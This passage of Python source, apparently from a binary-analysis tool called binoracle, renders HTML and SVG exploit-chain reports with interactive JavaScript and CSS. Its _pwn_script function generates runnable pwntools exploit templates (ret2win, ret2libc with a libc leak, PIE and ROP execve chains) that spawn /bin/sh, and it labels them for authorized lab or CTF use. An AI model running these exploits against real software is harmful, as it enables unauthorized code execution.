  function apply(){ vp.setAttribute('transform','translate('+tx+','+ty+') scale('+scale+')'); }
  function redraw(id){
    vp.querySelectorAll('.cfge').forEach(function(e){
      var s=e.getAttribute('data-s'), d=e.getAttribute('data-d');
      if(s!==id && d!==id) return;
      var sg=vp.querySelector('.cfgnode[data-id="'+s+'"]'), dg=vp.querySelector('.cfgnode[data-id="'+d+'"]');
      if(!sg||!dg) return; var a=tf(sg), b=tf(dg), ah=nh(sg);
      var x1=a.x+W/2, y1=a.y+ah, x2=b.x+W/2, y2=b.y, my=(y1+y2)/2;
      e.setAttribute('d','M'+x1+','+y1+' C'+x1+','+my+' '+x2+','+my+' '+x2+','+y2);
    });
  }
  svg.addEventListener('mousedown',function(ev){ if(ev.target.closest('.cfgnode')) return;
    var sx=ev.clientX, sy=ev.clientY, ox=tx, oy=ty;
    function mv(e2){ tx=ox+(e2.clientX-sx); ty=oy+(e2.clientY-sy); apply(); }
    function up(){ document.removeEventListener('mousemove',mv); document.removeEventListener('mouseup',up); }
    document.addEventListener('mousemove',mv); document.addEventListener('mouseup',up); });
  svg.addEventListener('wheel',function(ev){ ev.preventDefault(); var f=ev.deltaY<0?1.1:0.9;
    var r=svg.getBoundingClientRect(), mx=ev.clientX-r.left, my=ev.clientY-r.top;
    tx=mx-(mx-tx)*f; ty=my-(my-ty)*f; scale*=f; apply(); }, {passive:false});
  vp.querySelectorAll('.cfgnode').forEach(function(g){
    g.addEventListener('mousedown',function(ev){ ev.stopPropagation(); var p=tf(g), sx=ev.clientX, sy=ev.clientY, moved=false;
      function mv(e2){ if(Math.abs(e2.clientX-sx)+Math.abs(e2.clientY-sy)>3) moved=true;
        var nx=p.x+(e2.clientX-sx)/scale, ny=p.y+(e2.clientY-sy)/scale;
        g.setAttribute('transform','translate('+nx+','+ny+')'); redraw(g.getAttribute('data-id')); }
      function up(){ document.removeEventListener('mousemove',mv); document.removeEventListener('mouseup',up);
        if(!moved) showInfo(g.getAttribute('data-id')); }
      document.addEventListener('mousemove',mv); document.addEventListener('mouseup',up); });
  });
  window.cfgReset=function(){ var gs=vp.querySelectorAll('.cfgnode'); if(!gs.length) return;
    var minx=1e9,miny=1e9,maxx=-1e9,maxy=-1e9;
    gs.forEach(function(g){ var p=tf(g), h=nh(g); minx=Math.min(minx,p.x); miny=Math.min(miny,p.y); maxx=Math.max(maxx,p.x+W); maxy=Math.max(maxy,p.y+h); });
    var bw=maxx-minx, bh=maxy-miny, cw=svg.clientWidth||800, ch=svg.clientHeight||460;
    scale=Math.min(1, Math.min(cw/(bw+80), ch/(bh+80))) || 1;
    tx=cw/2-(minx+bw/2)*scale; ty=24-miny*scale; apply(); };
  cfgReset();
})();
"""


# colores por tipo de nodo del grafo de explotacion
_XK_COL = {"vuln": "#e5484d", "primitive": "#f5a623", "control": "#4aa3ff",
           "gadget": "#12a594", "target": "#8e4ec6"}


def _pwn_script(c) -> str:
    """Script pwntools EJECUTABLE que reproduce la cadena verificada, anclado a la prueba concreta
    (offset/win/base/estrategia). Para laboratorio autorizado. El usuario solo pone la ruta del
    binario (y HOST:PORT si es remoto)."""
    pr = getattr(c, "proof", None) or {}
    off = pr.get("offset")
    strat = (pr.get("strategy") or "").lower()
    win = pr.get("win")
    base = pr.get("base")
    H = ["#!/usr/bin/env python3",
         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
         f"# cadena: {c.name} -> {c.target} | estrategia VERIFICADA: {strat}",
         "from pwn import *",
         "context.update(arch='amd64', os='linux')",
         "BINARY = './target'   # <-- pon aqui la ruta a TU binario",
         "elf = context.binary = ELF(BINARY, checksec=False)",
         "io = process(BINARY)   # o: io = remote('HOST', PORT)"]
    if off is None:
        return "\n".join(H + ["# offset no resuelto durante la verificacion"])
    if "ret2win" in strat:
        body = [f"OFFSET = {off}",
                "ret = next(elf.search(asm('ret'), executable=True), 0)  # alineacion de pila (16B)",
                f"WIN = {win}",
                "payload = flat({OFFSET: [ret, WIN]})",
                "io.sendline(payload)",
                "io.interactive()"]
    elif "leak" in strat:                       # ret2libc con fuga de libc
        body = [f"OFFSET = {off}",
                "rop = ROP(elf)",
                "rop.raw(rop.find_gadget(['ret']).address)",
                "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])  # fuga + reentrada",
                "io.sendline(flat({OFFSET: rop.chain()}))",
                "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
                "libc = elf.libc; libc.address = leak - libc.sym['puts']",
                "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
                "io.sendline(flat({OFFSET: rop2.chain()}))",
                "io.interactive()"]
    elif "pie" in strat:
        body = [f"OFFSET = {off}",
                f"# PIE: base observada en el sandbox (ASLR off) = {base}",
                "# con ASLR real necesitas un leak: elf.address = leak - offset_conocido",
                f"elf.address = {base or 0}   # sandbox ASLR-off",
                "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                "rop = ROP(elf)",
                "sysaddr = (elf.plt.get('system') or elf.sym.get('system'))",
                "rop.raw(rop.find_gadget(['ret']).address)",
                "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
                "io.sendline(b'A'*OFFSET + rop.chain())",
                "io.interactive()"]
    else:                                        # ret2libc-static / rop / execve (direcciones fijas)
        body = [f"OFFSET = {off}",
                "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                "rop = ROP(elf)",
                "sysaddr = (elf.plt.get('system') or elf.sym.get('system'))",
                "if sysaddr and binsh:",
                "    rop.raw(rop.find_gadget(['ret']).address)",
                "    rop.call(sysaddr, [binsh])                 # ret2libc system('/bin/sh')",
                "else:",
                "    rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0",
                "    rop.raw(rop.find_gadget(['syscall', 'ret']).address)  # execve('/bin/sh')",
                "io.sendline(flat({OFFSET: rop.chain()}))",
                "io.interactive()"]
    return "\n".join(H + body)


def _cveplan_html(plan, lang: str) -> str:
    """Esquema de explotacion (de la vulnerabilidad al exploit, 'a la inversa'): clase -> primitiva ->
    concrecion con el binario (offset/gadgets/objetivo) -> fases -> mitigaciones a sortear -> refs del
    RAG. Si hay cadena VERIFICADA en sandbox, muestra la prueba y el script pwntools reproducible."""
    if plan is None or not getattr(plan, "ok", False):
        return ""
    es = lang == "es"
    parts = [f'<h2 data-i18n="exploit_plan" id="sec-exploitplan"></h2>']
    note = (("Esquema tecnico y grounded de explotacion. Solo objetivos autorizados / CTF / research."
             if es else
             "Grounded technical exploitation schema. Authorized targets / CTF / research only."))
    parts.append(f'<p class="poc-note">{_esc(note)}</p>')
    # cabecera: clase + primitiva (+ cve si hay)
    head = []
    if plan.cve:
        head.append(_badge(plan.cve, "#8e4ec6"))
    head.append(_badge(("clase: " if es else "class: ") + (plan.vuln_class or "?"), "#5b8def"))
    if plan.verified:
        head.append(_badge("VERIFICADO" if es else "VERIFIED", "#30a46c"))
    parts.append('<div class="xpl-head">' + "".join(head) + '</div>')
    if plan.primitive:
        parts.append(f'<p class="xpl-prim"><b>{"Primitiva" if es else "Primitive"}:</b> '
                     f'{_esc(plan.primitive)}</p>')
    # concrecion con el binario (datos reales del analizador de cadenas)
    c = plan.concrete or {}
    if c:
        rows = []
        if c.get("offset") is not None:
            rows.append((("offset a RIP" if es else "RIP offset"), f'<code>{_esc(c["offset"])}</code>'))
        if c.get("reg_gadgets"):
            g = ", ".join(f'{k.upper()}@<code>{_esc(v)}</code>' for k, v in c["reg_gadgets"].items() if v)
            if g:
                rows.append(("gadgets", g))
        if c.get("pivot"):
            rows.append((("pivot RSP" if es else "RSP pivot"), f'<code>{_esc(c["pivot"])}</code>'))
        if c.get("target"):
            rows.append((("objetivo" if es else "target"), f'<code>{_esc(c["target"])}</code>'))
        if c.get("gadgets_total"):
            rows.append((("gadgets totales" if es else "total gadgets"), _esc(c["gadgets_total"])))
        if c.get("chain"):
            rows.append((("cadena" if es else "chain"), f'<code>{_esc(c["chain"])}</code>'))
        if rows:
            body = "".join(f'<tr><th>{_esc(k)}</th><td>{v}</td></tr>' for k, v in rows)
            parts.append(f'<table class="dectech xpl-conc"><tbody>{body}</tbody></table>')
    # prueba de la ejecucion en sandbox (si verificada)
    if plan.verified and plan.proof:
        pr = plan.proof
        pline = "  ".join(f'{k}={v}' for k, v in pr.items() if k != "output" and v)
        parts.append('<div class="xgverified">'
                     f'<span class="proof-ok">&#10003;</span> '
                     f'{"Exploit verificado por ejecucion en sandbox" if es else "Exploit verified by sandbox execution"}'
                     f' &middot; <code>{_esc(pline)}</code></div>')
        out = (pr.get("output") or "").strip()
        if out:
            parts.append(f'<pre class="evpre">{_esc(out[:1200])}</pre>')
    # fases (paso a paso)
    if plan.phases:
        th = (("Fase", "Objetivo", "Tecnica", "Necesita") if es else
              ("Phase", "Goal", "Technique", "Needs"))
        head_r = "".join(f'<th>{_esc(x)}</th>' for x in th)
        body_r = ""
        for p in plan.phases:
            body_r += (f'<tr><td><b>{_esc(p.name)}</b></td><td>{_esc(p.goal)}</td>'
                       f'<td>{_esc(p.technique)}</td><td>{_esc(p.needs)}</td></tr>')
        parts.append(f'<h4>{"Fases" if es else "Phases"}</h4>'
                     f'<table class="dectech"><thead><tr>{head_r}</tr></thead><tbody>{body_r}</tbody></table>')
    # mitigaciones a sortear
    if plan.mitigations:
        lis = "".join(f'<li>{_esc(m)}</li>' for m in plan.mitigations)
        parts.append(f'<h4>{"Mitigaciones a sortear" if es else "Mitigations to bypass"}</h4>'
                     f'<ul class="xpl-mit">{lis}</ul>')
    # referencias del RAG (cheat sheets)
    if plan.kb_refs:
        chips = "".join(f'<span class="evsrc">{_esc(r)}</span>' for r in plan.kb_refs)
        parts.append(f'<h4>{"Conocimiento (RAG)" if es else "Knowledge (RAG)"}</h4>'
                     f'<div class="evchips">{chips}</div>')
    # script pwntools reproducible (exploit desarrollado)
    if plan.script:
        parts.append(f'<h4>{"Exploit desarrollado (pwntools)" if es else "Developed exploit (pwntools)"}</h4>')
        parts.append(f'<pre class="pwnscript">{_esc(plan.script)}</pre>')
    return "\n".join(parts)


def _exploit_html(an, lang: str) -> str:
    """Exploit Chain Analyzer: grafo interactivo (Vulnerabilidad -> Primitiva -> Control -> Gadget...
    -> Objetivo) renderizado en servidor + interactividad (pan/zoom/arrastrar, inspeccionar nodo,
    filtrar por cadena, reproducir paso a paso), comparacion tecnica y tablas de factibilidad."""
    if an is None:
        return ""
    if not getattr(an, "applicable", True):
        title = _I18N.get(lang, _I18N["es"]).get("exploit_chains", "Exploit chains")
        note = getattr(an, "note", "") or ""
        return (f'<h2 data-i18n="exploit_chains" id="sec-xchain">{_esc(title)}</h2>'
                f'<p class="mut">{_esc(note)}</p>')
    if not getattr(an, "ok", False):
        return ""
    es = lang == "es"
    g = an.graph
    nodes = {n["id"]: dict(n) for n in g["nodes"]}
    edges = g["edges"]
    # layout columnar: vuln a la izquierda; cada cadena en su fila; pasos en columnas.
    COLW, ROWH, NW = 200, 118, 168
    # profundidad (columna) de cada nodo siguiendo las aristas desde vuln
    col = {"vuln": 0}
    rowof = {}
    for e in edges:
        col[e["dst"]] = max(col.get(e["dst"], 0), col.get(e["src"], 0) + 1)
        rowof[e["dst"]] = e["chain"]
    nchains = len(an.chains)
    for nid in nodes:
        c = rowof.get(nid, 0)
        nodes[nid]["x"] = col.get(nid, 0) * COLW
        nodes[nid]["y"] = (0 if nid == "vuln" else c * ROWH)
    # centra el nodo vuln verticalmente
    if nchains:
        nodes["vuln"]["y"] = (nchains - 1) * ROWH / 2
    # aristas
    edges_svg = ""
    for e in edges:
        a, b = nodes.get(e["src"]), nodes.get(e["dst"])
        if not a or not b:
            continue
        x1, y1 = a["x"] + NW, a["y"] + 28
        x2, y2 = b["x"], b["y"] + 28
        mx = (x1 + x2) / 2
        col_e = "#30a46c" if e.get("ok") else "#e5484d"
        dash = "" if e.get("ok") else ' stroke-dasharray="5,4"'
        edges_svg += (f'<path class="xge" data-c="{e["chain"]}" d="M{x1:.0f},{y1:.0f} '
                      f'C{mx:.0f},{y1:.0f} {mx:.0f},{y2:.0f} {x2:.0f},{y2:.0f}" fill="none" '
                      f'stroke="{col_e}" stroke-width="2"{dash} marker-end="url(#xah)"/>')
    # nodos
    nodes_svg = ""
    info = {}
    for nid, n in nodes.items():
        kind = n["kind"]
        vrf = bool(n.get("verified"))
        col_n = "#30a46c" if vrf else _XK_COL.get(kind, "#12a594")   # verde si esta VERIFICADO
        lbl = (n["label"] or "").split("\n")
        title = _esc(lbl[0][:22])
        sub = _esc(lbl[1][:20]) if len(lbl) > 1 else ""
        chain_attr = "" if nid == "vuln" else f' data-c="{rowof.get(nid, 0)}"'
        badge = (f'<text x="{NW - 10}" y="20" class="xgok" text-anchor="end">&#10003;</text>'
                 if vrf else "")
        nodes_svg += (f'<g class="xgnode{" xgverified" if vrf else ""}" data-id="{nid}"{chain_attr} '
                      f'transform="translate({n["x"]:.0f},{n["y"]:.0f})">'
                      f'<rect width="{NW}" height="56" rx="9" style="stroke:{col_n}"'
                      f'{" stroke-width=2.5" if vrf else ""}/>'
                      f'<rect width="6" height="56" rx="3" fill="{col_n}"/>'
                      f'<text x="16" y="23" class="xgt">{title}</text>'
                      f'<text x="16" y="42" class="xgsub">{sub}</text>{badge}</g>')
        regs = "; ".join(f"{k}={v}" for k, v in (n.get("regs") or {}).items())
        info[nid] = {"label": n["label"], "kind": kind, "detail": n.get("detail", ""),
                     "regs": regs, "stack": n.get("stack", ""), "constraints": n.get("constraints", "")}
    W_svg = (max((n["x"] for n in nodes.values()), default=0) + NW + 40)
    H_svg = (max((n["y"] for n in nodes.values()), default=0) + 90)
    # botones de filtro por cadena
    fbtns = "".join(
        f'<button class="xgf" data-c="{i}" onclick="xgFilter({i},this)">'
        f'<i style="background:{"#30a46c" if c.feasible else "#e5484d"}"></i>{_esc(c.name)} '
        f'<b>{c.score}</b></button>' for i, c in enumerate(an.chains))
    # tabla comparativa tecnica
    th = (["Cadena", "Factible", "Puntuacion", "Gadgets", "Requisitos faltan", "Objetivo"] if es
          else ["Chain", "Feasible", "Score", "Gadgets", "Missing reqs", "Target"])
    rows = ""
    for c in an.chains:
        miss = c.score_detail.get("requisitos_incumplidos", 0)
        fe = ("si" if c.feasible else "no") if es else ("yes" if c.feasible else "no")
        fc = "#30a46c" if c.feasible else "#e5484d"
        rows += (f'<tr><td><b>{_esc(c.name)}</b></td><td style="color:{fc};font-weight:700">{fe}</td>'
                 f'<td>{c.score}</td><td>{len(c.gadgets_used)}</td><td>{miss}</td>'
                 f'<td><code>{_esc(c.target)}</code></td></tr>')
    cmp_tbl = (f'<table class="xgcmp"><thead><tr>' + "".join(f"<th>{_esc(h)}</th>" for h in th)
               + f'</tr></thead><tbody>{rows}</tbody></table>')
    # tarjetas de factibilidad detallada por cadena (con export)
    cards = ""
    for i, c in enumerate(an.chains):
        L = ("Requisitos", "Registros", "Gadgets usados", "Restricciones", "Mitigaciones",
             "Puntos de rotura", "Simulacion") if es else \
            ("Requirements", "Registers", "Gadgets used", "Constraints", "Mitigations",
             "Break points", "Simulation")
        def _ul(items):
            return "<ul class='xgul'>" + "".join(f"<li>{_esc(x)}</li>" for x in items) + "</ul>" if items else "<span class='mut'>-</span>"
        gtxt = [hex(a) for a in c.gadgets_used] or []
        steps_txt = " -> ".join((s.label + (f"@{hex(s.addr)}" if s.addr else "")) for s in c.steps)
        verified = getattr(c, "verified", False)
        if verified:
            export = _pwn_script(c)          # script pwntools ejecutable (cadena verificada)
        else:
            export = (f"# {c.name} | objetivo={c.target} | factible={c.feasible} | score={c.score}\n"
                      f"# SOLO laboratorio autorizado. Representacion reproducible del plan.\n"
                      f"cadena: {steps_txt}\n"
                      + "\n".join("req: " + r for r in c.requirements)
                      + ("\ngadgets: " + ", ".join(gtxt) if gtxt else ""))
        if verified:
            fe, fc = ("VERIFICADA" if es else "VERIFIED"), "#30a46c"
        else:
            fe = ("FACTIBLE" if c.feasible else "INCOMPATIBLE") if es else ("FEASIBLE" if c.feasible else "INCOMPATIBLE")
            fc = "#f5a623" if c.feasible else "#e5484d"
        # bloque de PRUEBA para las cadenas verificadas por ejecucion
        proof_html = ""
        pr = getattr(c, "proof", None) or {}
        if verified and pr:
            plabel = "Prueba de ejecucion (sandbox)" if es else "Execution proof (sandbox)"
            rows = "".join(
                f"<li><b>{_esc(k)}:</b> {_esc(str(v))}</li>"
                for k, v in (("strategy", pr.get("strategy")), ("offset", pr.get("offset")),
                             ("base", pr.get("base")), ("win", pr.get("win")),
                             ("marcador" if es else "marker", pr.get("marker"))) if v not in (None, ""))
            out = pr.get("output", "")
            proof_html = (f'<div class="xgproof"><div class="xgh" style="color:#30a46c">{plabel}</div>'
                          f'<ul class="xgul">{rows}</ul>'
                          + (f'<pre class="evpre">{_esc(out)}</pre>' if out else "") + '</div>')
        cards += (
            f'<details class="xgcard"{" open" if i == 0 else ""}><summary>'
            f'<span class="xgbadge" style="background:{fc}">{fe}</span> <b>{_esc(c.name)}</b> '
            f'<span class="mut">-> {_esc(c.target)}</span> '
            f'<span class="xgscore">{("puntuacion tecnica" if es else "technical score")}: {c.score}</span>'
            f'</summary>'
            f'{proof_html}'
            f'<div class="xggrid">'
            f'<div><div class="xgh">{L[0]}</div>{_ul(c.requirements)}</div>'
            f'<div><div class="xgh">{L[1]}</div>{_ul(c.regs_needed)}</div>'
            f'<div><div class="xgh">{L[2]}</div>{_ul(gtxt)}</div>'
            f'<div><div class="xgh">{L[3]}</div>{_ul(c.constraints)}</div>'
            f'<div><div class="xgh">{L[4]}</div>{_ul(c.mitigations)}</div>'
            f'<div><div class="xgh">{L[5]}</div>{_ul(c.break_points)}</div>'
            f'</div>'
            f'<div class="xgsim"><b>{L[6]}:</b> {_esc(c.sim_result)}</div>'
            f'<details class="xgexp"><summary>{(("Exportar script pwntools" if verified else "Exportar plan") + " (uso autorizado)") if es else (("Export pwntools script" if verified else "Export plan") + " (authorized use)")}</summary>'
            f'<pre class="evpre">{_esc(export)}</pre></details>'
            f'</details>')
    T = {"hint": ("Arrastra el fondo para moverte, rueda para zoom. Pulsa un nodo para inspeccionar "
                  "su estado (registros, stack, restricciones). Filtra por cadena y reproduce paso a paso."
                  if es else "Drag the background to pan, wheel to zoom. Click a node to inspect its "
                  "state (registers, stack, constraints). Filter by chain and replay step by step."),
         "all": "todas" if es else "all", "prev": "< paso" if es else "< step",
         "next": "paso >" if es else "step >", "reset": "centrar" if es else "center",
         "tip": ("Pulsa un nodo para ver registros, stack y restricciones."
                 if es else "Click a node to see registers, stack and constraints."),
         "score_note": ("Puntuacion TECNICA por propiedades objetivas (gadgets, requisitos, "
                        "mitigaciones, conflictos). No es una recomendacion para atacar sistemas reales; "
                        "todo el analisis se limita al binario de laboratorio cargado."
                        if es else "TECHNICAL score from objective properties (gadgets, requirements, "
                        "mitigations, conflicts). Not a recommendation to attack real systems; all "
                        "analysis is limited to the loaded lab binary.")}
    legend = "".join(
        f'<span class="xg-lg"><i style="background:{_XK_COL[k]}"></i>{_esc(lbl)}</span>'
        for k, lbl in (("vuln", "vuln"), ("primitive", "primitiva" if es else "primitive"),
                       ("gadget", "gadget"), ("target", "objetivo" if es else "target")))
    # etiquetas del inspector dependientes de idioma (para no hardcodear espanol en el JS)
    xglbl = {"kind": {"vuln": "Vulnerabilidad" if es else "Vulnerability",
                      "primitive": "Primitiva" if es else "Primitive",
                      "control": "Control", "gadget": "Gadget",
                      "target": "Objetivo" if es else "Target"},
             "regs": "Registros" if es else "Registers", "stack": "Stack",
             "constraints": "Restricciones" if es else "Constraints"}
    js = (_EXPLOIT_JS
          .replace("__XGW__", str(int(W_svg)))
          .replace("__XGINFO__", _json.dumps(info, ensure_ascii=False).replace("</", "<\\/"))
          .replace("__XGLBL__", _json.dumps(xglbl, ensure_ascii=False).replace("</", "<\\/")))
    prim = "".join(f"<li>{_esc(p)}</li>" for p in an.primitives)
    ctrl = an.control
    _rg = ctrl.get("reg_gadgets") or {}
    _regtxt = ", ".join(f"{r.upper()}&larr;{_rg[r]['addr']}" for r in (ctrl.get("regs") or []) if r in _rg) \
        or (", ".join((ctrl.get("regs") or [])) or "-")
    _offtxt = (f"{ctrl.get('rip_offset')} B" if ctrl.get("rip_offset") is not None else ("s/d" if es else "n/a"))
    _bits = ctrl.get("arch_bits", 64)
    ripyes = "si" if es else "yes"
    ripno = "no"
    ctrl_txt = (
        f"RIP: {ripyes if ctrl.get('RIP') else ripno}"
        + (f" (@ RSP tras offset {_offtxt})" if ctrl.get('RIP') else "")
        + f" &middot; {'pivote RSP' if es else 'RSP pivot'}: "
        + (f"{ripyes} ({ctrl['pivot_gadget']})" if ctrl.get('pivot_gadget') else ripno)
        + f" &middot; SysV AMD{_bits}"
        + f"<br>{'gadgets de registro' if es else 'register gadgets'}: <code>{_regtxt}</code>")
    return (
        f'<h2 data-i18n="exploit_chains" id="sec-xchain"></h2>'
        f'<p class="mut" style="font-size:12px;margin:-4px 0 8px">{_esc(T["score_note"])}</p>'
        f'<div class="xgmeta"><div><b>{"Primitivas" if es else "Primitives"}:</b><ul class="xgul">{prim}</ul></div>'
        f'<div><b>{"Control" if es else "Control"}:</b> {ctrl_txt}<br><b>{"Objetivo" if es else "Target"}:</b> '
        f'<code>{_esc(an.target)}</code> &middot; {len(an.gadgets)} gadgets</div></div>'
        f'<div class="xgbar"><button class="xgf xgon" data-c="-1" onclick="xgFilter(-1,this)">{_esc(T["all"])}</button>'
        f'{fbtns}<span class="xgsp"></span>'
        f'<button class="ctl" onclick="xgStep(-1)">{_esc(T["prev"])}</button>'
        f'<button class="ctl" onclick="xgStep(1)">{_esc(T["next"])}</button>'
        f'<button class="ctl" onclick="xgReset()">{_esc(T["reset"])}</button></div>'
        f'<p class="mut" style="font-size:11.5px;margin:6px 0 6px">{_esc(T["hint"])} {legend}</p>'
        f'<div class="cfgflex"><div class="cfgwrap"><svg id="xgsvg" viewBox="0 0 {int(W_svg)} {int(H_svg)}"><defs>'
        f'<marker id="xah" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">'
        f'<path d="M0,0 L7,3 L0,6 Z" fill="context-stroke"/></marker></defs>'
        f'<g id="xgvp" transform="translate(20,20)">{edges_svg}{nodes_svg}</g></svg></div>'
        f'<div id="xginfo" class="cfginfo"><p class="mut">{_esc(T["tip"])}</p></div></div>'
        f'<h3 style="margin:16px 0 6px">{"Comparacion tecnica" if es else "Technical comparison"}</h3>{cmp_tbl}'
        f'<h3 style="margin:16px 0 6px">{"Factibilidad por cadena" if es else "Per-chain feasibility"}</h3>{cards}'
        f'<script>{js}</script>')


_EXPLOIT_JS = r"""
(function(){
  var W = __XGW__, INFO = __XGINFO__, LBL = __XGLBL__;
  var svg=document.getElementById('xgsvg'), vp=document.getElementById('xgvp'), panel=document.getElementById('xginfo');
  if(!svg||!vp) return;
  function esc(s){ return (s+'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
  function row(l,v){ return v? '<div class="cfgi-note" style="border-color:var(--acc)"><b>'+esc(l)+':</b> '+esc(v)+'</div>':''; }
  function showInfo(id){
    var d=INFO[id]; if(!d||!panel) return;
    panel.innerHTML='<div class="cfgi-a">'+esc((LBL.kind&&LBL.kind[d.kind])||d.kind)+'</div>'+
      '<div class="cfgi-code"><div class="cfgi-l">'+esc(d.label)+'</div></div>'+
      (d.detail?'<div class="cfgi-note">'+esc(d.detail)+'</div>':'')+
      row(LBL.regs,d.regs)+row(LBL.stack,d.stack)+row(LBL.constraints,d.constraints);
    vp.querySelectorAll('.xgnode').forEach(function(g){ g.classList.toggle('sel', g.getAttribute('data-id')===id); });
  }
  function nodeX(g){ var m=/translate\(([-\d.]+)/.exec(g.getAttribute('transform')||''); return m?parseFloat(m[1]):0; }
  var tx=20,ty=20,scale=1;
  function apply(){ vp.setAttribute('transform','translate('+tx+','+ty+') scale('+scale+')'); }
  svg.addEventListener('mousedown',function(ev){ if(ev.target.closest('.xgnode')) return;
    var sx=ev.clientX,sy=ev.clientY,ox=tx,oy=ty;
    function mv(e){ tx=ox+(e.clientX-sx); ty=oy+(e.clientY-sy); apply(); }
    function up(){ document.removeEventListener('mousemove',mv); document.removeEventListener('mouseup',up); }
    document.addEventListener('mousemove',mv); document.addEventListener('mouseup',up); });
  svg.addEventListener('wheel',function(ev){ ev.preventDefault(); var f=ev.deltaY<0?1.1:0.9;
    var r=svg.getBoundingClientRect(), mx=ev.clientX-r.left, my=ev.clientY-r.top;
    tx=mx-(mx-tx)*f; ty=my-(my-ty)*f; scale*=f; apply(); }, {passive:false});
  vp.querySelectorAll('.xgnode').forEach(function(g){
    g.addEventListener('click',function(){ showInfo(g.getAttribute('data-id')); }); });
  window.xgFilter=function(c,btn){
    document.querySelectorAll('.xgf').forEach(function(b){ b.classList.remove('xgon'); });
    if(btn) btn.classList.add('xgon');
    vp.querySelectorAll('.xgnode,.xge').forEach(function(el){
      var ec=el.getAttribute('data-c');
      var show = (c<0) || ec===null || ec===String(c) || el.getAttribute('data-id')==='vuln';
      el.style.display = show?'':'none';
    });
    xgStepReset();
  };
  var stepList=[], stepIdx=-1;
  function activeChain(){ var b=document.querySelector('.xgf.xgon'); return b?+b.getAttribute('data-c'):-1; }
  function xgStepReset(){ stepIdx=-1; var c=activeChain();
    stepList=[].slice.call(vp.querySelectorAll('.xgnode')).filter(function(g){
      var gc=g.getAttribute('data-c'); return c<0? true : (gc===String(c)||g.getAttribute('data-id')==='vuln'); })
      .sort(function(a,b){ return nodeX(a)-nodeX(b); });
    vp.querySelectorAll('.xgnode').forEach(function(g){ g.classList.remove('step'); }); }
  window.xgStep=function(d){ if(!stepList.length) xgStepReset(); if(!stepList.length) return;
    stepIdx=Math.max(0,Math.min(stepList.length-1,stepIdx+d));
    stepList.forEach(function(g,i){ g.classList.toggle('step', i<=stepIdx); });
    var cur=stepList[stepIdx]; if(cur) showInfo(cur.getAttribute('data-id')); };
  window.xgReset=function(){ tx=20; ty=20; scale=1; apply();
    document.querySelectorAll('.xgf').forEach(function(b){ b.classList.toggle('xgon', b.getAttribute('data-c')==='-1'); });
    window.xgFilter(-1,document.querySelector('.xgf[data-c="-1"]')); };
  apply(); xgStepReset();
})();
"""


_CSS = """
:root{--bg:#f6f7f9;--panel:#ffffff;--fg:#1a2027;--mut:#6b7683;--line:#e3e7ec;--acc:#2f6feb;--code:#f0f2f5;--codefg:#243b53}
:root[data-theme=dark]{--bg:#0d1117;--panel:#161b22;--fg:#d7dde4;--mut:#8b95a1;--line:#232a33;--acc:#4aa3ff;--code:#0b0e12;--codefg:#cfe3ff}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.55 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,sans-serif}
header{display:flex;align-items:center;gap:16px;padding:14px 22px;border-bottom:1px solid var(--line);background:var(--panel);position:sticky;top:0;z-index:9;flex-wrap:wrap}
.brand{font-weight:700;font-size:16px;display:flex;align-items:center;gap:8px}
.brand em{font-style:normal;font-weight:400;color:var(--mut);font-size:12px}
.dot{width:10px;height:10px;border-radius:50%;background:var(--acc);box-shadow:0 0 10px var(--acc)}
.hmeta{color:var(--mut);font-size:12px;flex:1;min-width:160px}
.hmeta code{background:var(--code);padding:2px 6px;border-radius:5px;color:var(--codefg)}
.controls{display:flex;gap:8px}
.ctl{background:var(--panel);border:1px solid var(--line);color:var(--fg);border-radius:8px;padding:5px 11px;cursor:pointer;font-size:13px;min-width:38px}
.ctl:hover{border-color:var(--acc)}
main{max-width:1040px;margin:0 auto;padding:22px 16px 90px}
.dash{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:8px}
@media(max-width:720px){.dash{grid-template-columns:1fr}}
.kpis{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.kpi{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
.kpi-v{font-size:30px;font-weight:800;line-height:1}
.kpi-l{color:var(--mut);font-size:12px;margin-top:6px;text-transform:uppercase;letter-spacing:.04em}
.panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
.panel-t{font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:.04em;margin-bottom:8px}
.dist{display:flex;height:12px;border-radius:6px;overflow:hidden;background:var(--line)}
.dist span{display:block;height:100%}
.mits{display:flex;flex-wrap:wrap;gap:8px}
.mit{display:flex;flex-direction:column;border:1px solid var(--line);border-radius:9px;padding:7px 12px;min-width:74px}
.mit-k{font-size:10px;color:var(--mut);text-transform:uppercase}
.mit-v{font-weight:700;font-size:14px}
.mit.ok .mit-v{color:#2f9e5f}.mit.bad .mit-v{color:#e5484d}.mit.warn .mit-v{color:#e5a000}.mit.mut .mit-v{color:var(--mut)}
h2{font-size:15px;border-bottom:1px solid var(--line);padding-bottom:7px;margin:30px 0 12px}
.toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:14px}
#q{flex:1;min-width:180px;background:var(--panel);border:1px solid var(--line);border-radius:8px;color:var(--fg);padding:8px 11px}
.fbtn{display:flex;align-items:center;gap:6px;background:var(--panel);color:var(--fg);border:1px solid var(--line);border-radius:16px;padding:5px 12px;cursor:pointer;font-size:12px;text-transform:capitalize}
.fbtn i{width:9px;height:9px;border-radius:50%}.fbtn b{color:var(--fg)}.fbtn.boff{opacity:.35}
.card{border:1px solid var(--line);border-radius:11px;margin:10px 0;background:var(--panel);overflow:hidden}
summary.card-h{padding:12px 14px;cursor:pointer;display:flex;align-items:center;gap:7px;flex-wrap:wrap;list-style:none}
summary.card-h::-webkit-details-marker{display:none}
summary.card-h::marker{content:""}
